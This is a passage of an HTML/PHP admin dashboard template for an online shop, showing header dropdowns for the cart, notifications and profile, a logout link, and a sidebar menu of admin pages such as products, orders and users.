                                                                        <a href="javascript:void(0);" class="header-cart-remove float-end dropdown-item-close"><i class="ti ti-trash"></i></a>
                                                                    </div>
                                                                </div>
                                                                <div class="min-w-fit-content d-flex align-items-start justify-content-between">
                                                                    <ul class="header-product-item d-flex">
                                                                        <li>Metallic Blue</li>
                                                                        <li>6gb Ram</li>
                                                                    </ul>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </li>
                                                    <li class="dropdown-item">
                                                        <div class="d-flex align-items-start cart-dropdown-item">
                                                            <img src="../assets/images/ecommerce/jpg/3.jpg" alt="img" class="avatar avatar-sm avatar-rounded br-5 me-3">
                                                            <div class="flex-grow-1">
                                                                <div class="d-flex align-items-start justify-content-between mb-0">
                                                                    <div class="mb-0 fs-13 text-dark fw-semibold">
                                                                        <a href="cart.html">Stop Watch</a>
                                                                    </div>
                                                                    <div> <span class="text-black mb-1">$179.29</span>
                                                                        <a href="javascript:void(0);" class="header-cart-remove float-end dropdown-item-close"><i class="ti ti-trash"></i></a>
                                                                    </div>
                                                                </div>
                                                                <div class="min-w-fit-content d-flex align-items-start justify-content-between">
                                                                    <ul class="header-product-item">
                                                                        <li>Analog</li>
                                                                        <li><span class="badge bg-pink-transparent fs-10">Free
                                                                                shipping</span></li>
                                                                    </ul>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </li>
                                                    <li class="dropdown-item">
                                                        <div class="d-flex align-items-start cart-dropdown-item">
                                                            <img src="../assets/images/ecommerce/jpg/5.jpg" alt="img" class="avatar avatar-sm avatar-rounded br-5 me-3">
                                                            <div class="flex-grow-1">
                                                                <div class="d-flex align-items-start justify-content-between mb-0">
                                                                    <div class="mb-0 fs-13 text-dark fw-semibold">
                                                                        <a href="cart.html">Photo Frame</a>
                                                                    </div>
                                                                    <div> <span class="text-black mb-1">$29.00</span>
                                                                        <a href="javascript:void(0);" class="header-cart-remove float-end dropdown-item-close"><i class="ti ti-trash"></i></a>
                                                                    </div>
                                                                </div>
                                                                <div class="min-w-fit-content d-flex align-items-start justify-content-between">
                                                                    <ul class="header-product-item d-flex">
                                                                        <li>Decorative</li>
                                                                    </ul>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </li>
                                                    <li class="dropdown-item">
                                                        <div class="d-flex align-items-start cart-dropdown-item">
                                                            <img src="../assets/images/ecommerce/jpg/4.jpg" alt="img" class="avatar avatar-sm avatar-rounded br-5 me-3">
                                                            <div class="flex-grow-1">
                                                                <div class="d-flex align-items-start justify-content-between mb-0">
                                                                    <div class="mb-0 fs-13 text-dark fw-semibold">
                                                                        <a href="cart.html">Kikon Camera</a>
                                                                    </div>
                                                                    <div> <span class="text-black mb-1">$4,999.00</span>
                                                                        <a href="javascript:void(0);" class="header-cart-remove float-end dropdown-item-close"><i class="ti ti-trash"></i></a>
                                                                    </div>
                                                                </div>
                                                                <div class="min-w-fit-content d-flex align-items-start justify-content-between">
                                                                    <ul class="header-product-item d-flex">
                                                                        <li>Black</li>
                                                                        <li>50MM</li>
                                                                    </ul>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </li>
                                                    <li class="dropdown-item">
                                                        <div class="d-flex align-items-start cart-dropdown-item">
                                                            <img src="../assets/images/ecommerce/jpg/6.jpg" alt="img" class="avatar avatar-sm avatar-rounded br-5 me-3">
                                                            <div class="flex-grow-1">
                                                                <div class="d-flex align-items-start justify-content-between mb-0">
                                                                    <div class="mb-0 fs-13 text-dark fw-semibold">
                                                                        <a href="cart.html">Canvas Shoes</a>
                                                                    </div>
                                                                    <div> <span class="text-black mb-1">$129.00</span>
                                                                        <a href="javascript:void(0);" class="header-cart-remove float-end dropdown-item-close"><i class="ti ti-trash"></i></a>
                                                                    </div>
                                                                </div>
                                                                <div class="d-flex align-items-start justify-content-between">
                                                                    <ul class="header-product-item d-flex">
                                                                        <li>Gray</li>
                                                                        <li>Sports</li>
                                                                    </ul>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </li>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="simplebar-placeholder" style="width: 0px; height: 0px;"></div>
                                </div>
                                <div class="simplebar-track simplebar-horizontal" style="visibility: hidden;">
                                    <div class="simplebar-scrollbar" style="width: 0px; display: none;"></div>
                                </div>
                                <div class="simplebar-track simplebar-vertical" style="visibility: hidden;">
                                    <div class="simplebar-scrollbar" style="height: 0px; display: none;"></div>
                                </div>
                            </ul>
                            <div class="p-3 empty-header-item border-top">
                                <div class="d-grid"> <a href="checkout.html" class="btn btn-primary">Proceed to
                                        checkout</a> </div>
                            </div>
                            <div class="p-5 empty-item d-none">
                                <div class="text-center"> <span class="avatar avatar-xl avatar-rounded bg-warning-transparent">
                                        <i class="ri-shopping-cart-2-line fs-2"></i> </span>
                                    <h6 class="fw-bold mb-1 mt-3">Your Cart is Empty</h6> <span class="mb-3 fw-normal fs-13 d-block">Add some items to make me happy
                                        :)</span>
                                    <a href="products.html" class="btn btn-primary btn-wave btn-sm m-1 waves-effect waves-light" data-abc="true">continue shopping <i class="bi bi-arrow-right ms-1"></i></a>
                                </div>
                            </div>
                        </div> <!-- End::main-header-dropdown -->
                    </div> <!-- End::header-element -->
                    <!-- Start::header-element -->
                    <div class="header-element notifications-dropdown" style="display: none;">
                        <!-- Start::header-link|dropdown-toggle --> <a href="javascript:void(0);" class="header-link dropdown-toggle" data-bs-toggle="dropdown" data-bs-auto-close="outside" id="messageDropdown" aria-expanded="false"> <i class="bx bx-bell header-link-icon"></i>
                            <span class="badge bg-secondary rounded-pill header-icon-badge pulse pulse-secondary" id="notification-icon-badge">5</span> </a>
                        <!-- End::header-link|dropdown-toggle -->
                        <!-- Start::main-header-dropdown -->
                        <div class="main-header-dropdown dropdown-menu dropdown-menu-end" data-popper-placement="none">
                            <div class="p-3">
                                <div class="d-flex align-items-center justify-content-between">
                                    <p class="mb-0 fs-17 fw-semibold">Notifications</p><span class="badge bg-secondary-transparent" id="notifiation-data">5
                                        Unread</span>
                                </div>
                            </div>
                            <div class="dropdown-divider"></div>
                            <ul class="list-unstyled mb-0" id="header-notification-scroll" data-simplebar="init">
                                <div class="simplebar-wrapper" style="margin: 0px;">
                                    <div class="simplebar-height-auto-observer-wrapper">
                                        <div class="simplebar-height-auto-observer"></div>
                                    </div>
                                    <div class="simplebar-mask">
                                        <div class="simplebar-offset" style="right: 0px; bottom: 0px;">
                                            <div class="simplebar-content-wrapper" tabindex="0" role="region" aria-label="scrollable content" style="height: auto; overflow: hidden;">
                                                <div class="simplebar-content" style="padding: 0px;">
                                                    <li class="dropdown-item">
                                                        <div class="d-flex align-items-start">
                                                            <div class="pe-2"> <span class="avatar avatar-md bg-primary-transparent avatar-rounded"><i class="ti ti-gift fs-18"></i></span>
                                                            </div>
                                                            <div class="flex-grow-1 d-flex align-items-center justify-content-between">
                                                                <div>
                                                                    <p class="mb-0 fw-semibold"><a href="notifications.html">Your
                                                                            Order Has
                                                                            Been Shipped</a></p><span class="text-muted fw-normal fs-12 header-notification-text">Order
                                                                        No: 123456 Has Shipped To Your Delivery
                                                                        Address</span>
                                                                </div>
                                                                <div> <a href="javascript:void(0);" class="min-w-fit-content text-muted me-1 dropdown-item-close1"><i class="ti ti-x fs-16"></i></a>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </li>
                                                    <li class="dropdown-item">
                                                        <div class="d-flex align-items-start">
                                                            <div class="pe-2"> <span class="avatar avatar-md bg-secondary-transparent avatar-rounded"><i class="ti ti-discount-2 fs-18"></i></span>
                                                            </div>
                                                            <div class="flex-grow-1 d-flex align-items-center justify-content-between">
                                                                <div>
                                                                    <p class="mb-0 fw-semibold"><a href="notifications.html">Discount
                                                                            Available</a></p><span class="text-muted fw-normal fs-12 header-notification-text">Discount
                                                                        Available On Selected Products</span>
                                                                </div>
                                                                <div> <a href="javascript:void(0);" class="min-w-fit-content text-muted me-1 dropdown-item-close1"><i class="ti ti-x fs-16"></i></a>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </li>
                                                    <li class="dropdown-item">
                                                        <div class="d-flex align-items-start">
                                                            <div class="pe-2"> <span class="avatar avatar-md bg-pink-transparent avatar-rounded"><i class="ti ti-user-check fs-18"></i></span>
                                                            </div>
                                                            <div class="flex-grow-1 d-flex align-items-center justify-content-between">
                                                                <div>
                                                                    <p class="mb-0 fw-semibold"><a href="notifications.html">Account
                                                                            Has Been
                                                                            Verified</a></p><span class="text-muted fw-normal fs-12 header-notification-text">Your
                                                                        Account Has Been Verified
                                                                        Sucessfully</span>
                                                                </div>
                                                                <div> <a href="javascript:void(0);" class="min-w-fit-content text-muted me-1 dropdown-item-close1"><i class="ti ti-x fs-16"></i></a>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </li>
                                                    <li class="dropdown-item">
                                                        <div class="d-flex align-items-start">
                                                            <div class="pe-2"> <span class="avatar avatar-md bg-warning-transparent avatar-rounded"><i class="ti ti-circle-check fs-18"></i></span>
                                                            </div>
                                                            <div class="flex-grow-1 d-flex align-items-center justify-content-between">
                                                                <div>
                                                                    <p class="mb-0 fw-semibold"><a href="notifications.html">Order
                                                                            Placed <span class="text-warning">ID:
                                                                                #1116773</span></a></p><span class="text-muted fw-normal fs-12 header-notification-text">Order
                                                                        Placed Successfully</span>
                                                                </div>
                                                                <div> <a href="javascript:void(0);" class="min-w-fit-content text-muted me-1 dropdown-item-close1"><i class="ti ti-x fs-16"></i></a>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </li>
                                                    <li class="dropdown-item">
                                                        <div class="d-flex align-items-start">
                                                            <div class="pe-2"> <span class="avatar avatar-md bg-success-transparent avatar-rounded"><i class="ti ti-clock fs-18"></i></span>
                                                            </div>
                                                            <div class="flex-grow-1 d-flex align-items-center justify-content-between">
                                                                <div>
                                                                    <p class="mb-0 fw-semibold"><a href="notifications.html">Order
                                                                            Delayed
                                                                            <span class="text-success">ID:
                                                                                7731116</span></a></p><span class="text-muted fw-normal fs-12 header-notification-text">Order
                                                                        Delayed Unfortunately</span>
                                                                </div>
                                                                <div> <a href="javascript:void(0);" class="min-w-fit-content text-muted me-1 dropdown-item-close1"><i class="ti ti-x fs-16"></i></a>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </li>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="simplebar-placeholder" style="width: 0px; height: 0px;"></div>
                                </div>
                                <div class="simplebar-track simplebar-horizontal" style="visibility: hidden;">
                                    <div class="simplebar-scrollbar" style="width: 0px; display: none;"></div>
                                </div>
                                <div class="simplebar-track simplebar-vertical" style="visibility: hidden;">
                                    <div class="simplebar-scrollbar" style="height: 0px; display: none;"></div>
                                </div>
                            </ul>
                            <div class="p-3 empty-header-item1 border-top">
                                <div class="d-grid"> <a href="notifications.html" class="btn btn-primary">View
                                        All</a>
                                </div>
                            </div>
                            <div class="p-5 empty-item1 d-none">
                                <div class="text-center"> <span class="avatar avatar-xl avatar-rounded bg-secondary-transparent"> <i class="ri-notification-off-line fs-2"></i> </span>
                                    <h6 class="fw-semibold mt-3">No New Notifications</h6>
                                </div>
                            </div>
                        </div> <!-- End::main-header-dropdown -->
                    </div> <!-- End::header-element -->
                    <!-- Start::header-element -->
                    <div class="header-element header-shortcuts-dropdown" style="display: none;">
                        <!-- Start::header-link|dropdown-toggle --> <a href="javascript:void(0);" class="header-link dropdown-toggle" data-bs-toggle="dropdown" data-bs-auto-close="outside" id="notificationDropdown" aria-expanded="false"> <i class="bx bx-grid-alt header-link-icon"></i>
                        </a>
                        <!-- End::header-link|dropdown-toggle -->
                        <!-- Start::main-header-dropdown -->
                        <div class="main-header-dropdown header-shortcuts-dropdown dropdown-menu pb-0 dropdown-menu-end" aria-labelledby="notificationDropdown">
                            <div class="p-3">
                                <div class="d-flex align-items-center justify-content-between">
                                    <p class="mb-0 fs-17 fw-semibold">Related Apps</p>
                                </div>
                            </div>
                            <div class="dropdown-divider mb-0"></div>
                            <div class="main-header-shortcuts p-2" id="header-shortcut-scroll" data-simplebar="init">
                                <div class="simplebar-wrapper" style="margin: -8px;">
                                    <div class="simplebar-height-auto-observer-wrapper">
                                        <div class="simplebar-height-auto-observer"></div>
                                    </div>
                                    <div class="simplebar-mask">
                                        <div class="simplebar-offset" style="right: 0px; bottom: 0px;">
                                            <div class="simplebar-content-wrapper" tabindex="0" role="region" aria-label="scrollable content" style="height: auto; overflow: hidden;">
                                                <div class="simplebar-content" style="padding: 8px;">
                                                    <div class="row g-2">
                                                        <div class="col-4"> <a href="javascript:void(0);">
                                                                <div class="text-center p-3 related-app"> <span class="avatar avatar-sm avatar-rounded">
                                                                        <img src="../assets/images/apps/figma.png" alt="">
                                                                    </span> <span class="d-block fs-12">Figma</span>
                                                                </div>
                                                            </a> </div>
                                                        <div class="col-4"> <a href="javascript:void(0);">
                                                                <div class="text-center p-3 related-app"> <span class="avatar avatar-sm avatar-rounded">
                                                                        <img src="../assets/images/apps/microsoft-powerpoint.png" alt=""> </span> <span class="d-block fs-12">Power
                                                                        Point</span> </div>
                                                            </a> </div>
                                                        <div class="col-4"> <a href="javascript:void(0);">
                                                                <div class="text-center p-3 related-app"> <span class="avatar avatar-sm avatar-rounded">
                                                                        <img src="../assets/images/apps/microsoft-word.png" alt="">
                                                                    </span> <span class="d-block fs-12">MS
                                                                        Word</span> </div>
                                                            </a> </div>
                                                        <div class="col-4"> <a href="javascript:void(0);">
                                                                <div class="text-center p-3 related-app"> <span class="avatar avatar-sm avatar-rounded">
                                                                        <img src="../assets/images/apps/calender.png" alt="">
                                                                    </span> <span class="d-block fs-12">Calendar</span>
                                                                </div>
                                                            </a> </div>
                                                        <div class="col-4"> <a href="javascript:void(0);">
                                                                <div class="text-center p-3 related-app"> <span class="avatar avatar-sm avatar-rounded">
                                                                        <img src="../assets/images/apps/sketch.png" alt="">
                                                                    </span> <span class="d-block fs-12">Sketch</span>
                                                                </div>
                                                            </a> </div>
                                                        <div class="col-4"> <a href="javascript:void(0);">
                                                                <div class="text-center p-3 related-app"> <span class="avatar avatar-sm avatar-rounded">
                                                                        <img src="../assets/images/apps/google-docs.png" alt="">
                                                                    </span> <span class="d-block fs-12">Docs</span>
                                                                </div>
                                                            </a> </div>
                                                        <div class="col-4"> <a href="javascript:void(0);">
                                                                <div class="text-center p-3 related-app"> <span class="avatar avatar-sm avatar-rounded">
                                                                        <img src="../assets/images/apps/google.png" alt="">
                                                                    </span> <span class="d-block fs-12">Google</span>
                                                                </div>
                                                            </a> </div>
                                                        <div class="col-4"> <a href="javascript:void(0);">
                                                                <div class="text-center p-3 related-app"> <span class="avatar avatar-sm avatar-rounded">
                                                                        <img src="../assets/images/apps/translate.png" alt="">
                                                                    </span> <span class="d-block fs-12">Translate</span>
                                                                </div>
                                                            </a> </div>
                                                        <div class="col-4"> <a href="javascript:void(0);">
                                                                <div class="text-center p-3 related-app"> <span class="avatar avatar-sm avatar-rounded">
                                                                        <img src="../assets/images/apps/google-sheets.png" alt="">
                                                                    </span> <span class="d-block fs-12">Sheets</span>
                                                                </div>
                                                            </a> </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="simplebar-placeholder" style="width: 0px; height: 0px;"></div>
                                </div>
                                <div class="simplebar-track simplebar-horizontal" style="visibility: hidden;">
                                    <div class="simplebar-scrollbar" style="width: 0px; display: none;"></div>
                                </div>
                                <div class="simplebar-track simplebar-vertical" style="visibility: hidden;">
                                    <div class="simplebar-scrollbar" style="height: 0px; display: none;"></div>
                                </div>
                            </div>
                            <div class="p-3 border-top">
                                <div class="d-grid"> <a href="javascript:void(0);" class="btn btn-primary">View
                                        All</a>
                                </div>
                            </div>
                        </div> <!-- End::main-header-dropdown -->
                    </div> <!-- End::header-element -->
                    <!-- Start::header-element -->
                    <div class="header-element header-fullscreen">
                        <!-- Start::header-link --> <a onclick="openFullscreen();" href="#" class="header-link">
                            <i class="bx bx-fullscreen full-screen-open header-link-icon"></i> <i class="bx bx-exit-fullscreen full-screen-close header-link-icon d-none"></i>
                        </a>
                        <!-- End::header-link -->
                    </div> <!-- End::header-element -->
                    <!-- Start::header-element -->
                    <div class="header-element">
                        <!-- Start::header-link|dropdown-toggle --> <a href="#" class="header-link dropdown-toggle" id="mainHeaderProfile" data-bs-toggle="dropdown" data-bs-auto-close="outside" aria-expanded="false">
                            <div class="d-flex align-items-center">
                                <div class="me-sm-2 me-0"> <img src="../assets/images/faces/9.jpg" alt="img" width="32" height="32" class="rounded-circle"> </div>
                                <div class="d-sm-block d-none">
                                    <p class="fw-semibold mb-0 lh-1"><?php
                                                                        if (isset($_SESSION['userid'])) {
                                                                            $get = $logout->getuserbyid($_SESSION['userid']);
                                                                            if (isset($get)) {
                                                                                if ($get && $get->num_rows > 0) {
                                                                                    $i = 0;
                                                                                    while ($result = $get->fetch_assoc()) {
                                                                                        echo $result['username'];
                                                                                    }
                                                                                }
                                                                            }
                                                                        }


                                                                        ?></p><span class="op-7 fw-normal d-block fs-11">Web
                                        Designer</span>
                                </div>
                            </div>
                        </a> <!-- End::header-link|dropdown-toggle -->
                        <ul class="main-header-dropdown dropdown-menu pt-0 overflow-hidden header-profile-dropdown dropdown-menu-end" aria-labelledby="mainHeaderProfile">
                            <li><a class="dropdown-item d-flex" href="profile.html"><i class="ti ti-user-circle fs-18 me-2 op-7"></i>Profile</a></li>
                            <li><a class="dropdown-item d-flex" href="mail.html"><i class="ti ti-inbox fs-18 me-2 op-7"></i>Inbox
                                    <span class="badge bg-success-transparent ms-auto">25</span></a></li>
                            <li><a class="dropdown-item d-flex border-block-end" href="to-do-list.html"><i class="ti ti-clipboard-check fs-18 me-2 op-7"></i>Task Manager</a></li>
                            <li><a class="dropdown-item d-flex" href="mail-settings.html"><i class="ti ti-adjustments-horizontal fs-18 me-2 op-7"></i>Settings</a>
                            </li>
                            <li><a class="dropdown-item d-flex border-block-end" href="javascript:void(0);"><i class="ti ti-wallet fs-18 me-2 op-7"></i>Bal: $7,12,950</a></li>
                            <li><a class="dropdown-item d-flex" href="chat.html"><i class="ti ti-headset fs-18 me-2 op-7"></i>Support</a></li>
                            <li><a class="dropdown-item d-flex" href="sign-in-cover.html"><i class="ti ti-logout fs-18 me-2 op-7"></i>Log Out</a></li>
                        </ul>
                    </div> <!-- End::header-element -->
                    <!-- Start::header-element -->
                    <div class="header-element">
                        <a onclick="return confirm('Xác nhận đăng xuất')" href="?action=logout" class="header-link">
                            <i class="ti ti-logout fs-18 me-2 op-7"></i> <i class="bx bx-exit-fullscreen full-screen-close header-link-icon d-none"></i>
                        </a>
                    </div> <!-- End::header-element -->
                </div> <!-- End::header-content-right -->
            </div> <!-- End::main-header-container -->
        </header> <!-- /app-header -->
        <!-- Start::app-sidebar -->
        <aside class="app-sidebar sticky" id="sidebar">
            <!-- Start::main-sidebar-header -->
            <div class="main-sidebar-header"> <a href="http://localhost/asm/" class="header-logo"> <img src="../assets/images/brand-logos/desktop-logo.png" alt="logo" class="desktop-logo">
                    <img src="../assets/images/brand-logos/toggle-logo.png" alt="logo" class="toggle-logo">
                    <img src="../ssss.png" alt="logo" class="desktop-dark"> <img src="../assets/images/brand-logos/toggle-dark.png" alt="logo" class="toggle-dark"> </a>
            </div>
            <!-- End::main-sidebar-header -->
            <!-- Start::main-sidebar -->
            <div class="main-sidebar" id="sidebar-scroll" data-simplebar="init">
                <div class="simplebar-wrapper" style="margin: -8px 0px -80px;">
                    <div class="simplebar-height-auto-observer-wrapper">
                        <div class="simplebar-height-auto-observer"></div>
                    </div>
                    <div class="simplebar-mask">
                        <div class="simplebar-offset" style="right: 0px; bottom: 0px;">
                            <div class="simplebar-content-wrapper" tabindex="0" role="region" aria-label="scrollable content" style="height: 100%; overflow: hidden scroll;">
                                <div class="simplebar-content" style="padding: 8px 0px 80px;">
                                    <!-- Start::nav -->
                                    <nav class="main-menu-container nav nav-pills flex-column sub-open open active">
                                        <div class="slide-left active d-none" id="slide-left"> <svg xmlns="http://www.w3.org/2000/svg" fill="#7b8191" width="24" height="24" viewBox="0 0 24 24">
                                                <path d="M13.293 6.293 7.586 12l5.707 5.707 1.414-1.414L10.414 12l4.293-4.293z">
                                                </path>
                                            </svg> </div>
                                        <ul class="main-menu" style="display: block; margin-left: 0px; margin-right: 0px;">
                                            <!-- Start::slide__category -->
                                            <li class="slide__category"><span class="category-name">Main</span></li>
                                            <!-- End::slide__category -->
                                            <!-- Start::slide -->
                                            <li class="slide has-sub active open"> <a href="Home.php" class="side-menu__item active"> <i class="bx bx-home side-menu__icon"></i> <span class="side-menu__label">Dashboards<span class="badge bg-warning-transparent ms-2">12</span></span>
                                                    <i class="fe fe-chevron-right side-menu__angle"></i> </a>
                                                <ul class="slide-menu child1 active" style="position: relative; left: 0px; top: 0px; margin: 0px; box-sizing: border-box; display: block; transform: translate(12.5px, 490px);" data-popper-placement="bottom">
                                                    <li class="slide side-menu__label1"> <a href="javascript:void(0)">Dashboards</a> </li>

                                                    <li class="slide"> <a href="../page/Banner.admin.php" class="side-menu__item">Banners +</a> </li>
                                                    <li class="slide"> <a href="../page/Blog.admin.php" class="side-menu__item">Blogs + </a> </li>
                                                    <li class="slide"> <a href="../page/Cart.admin.php" class="side-menu__item">Carts +</a> </li>
                                                    <li class="slide"> <a href="../page/Category.admin.php" class="side-menu__item">Category + </a> </li>
                                                    <li class="slide"> <a href="../page/Code.admin.php" class="side-menu__item">Codes + </a> </li>
                                                    <li class="slide"> <a href="../page/Compare.admin.php" class="side-menu__item">Compare + </a> </li>
                                                    <li class="slide"> <a href="../page/Contact.admin.php" class="side-menu__item">Contact + </a> </li>
                                                    <li class="slide"> <a href="../page/Order.admin.php" class="side-menu__item ">Order + </a> </li>
                                                    <li class="slide"> <a href="../page/Product.admin.php" class="side-menu__item">Products +</a> </li>
                                                    <li class="slide"> <a href="../page/Review.admin.php" class="side-menu__item">Reviews +</a> </li>
                                                    <li class="slide"> <a href="../page/User.admin.php" class="side-menu__item">Users + </a> </li>
                                                    <li class="slide"> <a href="../page/Wishlist.admin.php" class="side-menu__item">Wishlists + </a> </li>
                                                </ul>
                                            </li> <!-- End::slide -->

                                            <!-- End::slide -->
                                        </ul>
                                        <div class="slide-right d-none" id="slide-right"><svg xmlns="http://www.w3.org/2000/svg" fill="#7b8191" width="24" height="24" viewBox="0 0 24 24">
                                                <path d="M10.707 17.707 16.414 12l-5.707-5.707-1.414 1.414L13.586 12l-4.293 4.293z">
                                                </path>
                                            </svg></div>
                                    </nav> <!-- End::nav -->
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="simplebar-placeholder" style="width: auto; height: 1305px;"></div>
                </div>
                <div class="simplebar-track simplebar-horizontal" style="visibility: hidden;">
                    <div class="simplebar-scrollbar" style="width: 0px; transform: translate3d(0px, 0px, 0px); display: none;"></div>
                </div>
                <div class="simplebar-track simplebar-vertical" style="visibility: visible;">
                    <div class="simplebar-scrollbar" style="height: 323px; transform: translate3d(0px, 209px, 0px); display: block;">
                    </div>
                </div>
            </div> <!-- End::main-sidebar -->
        </aside>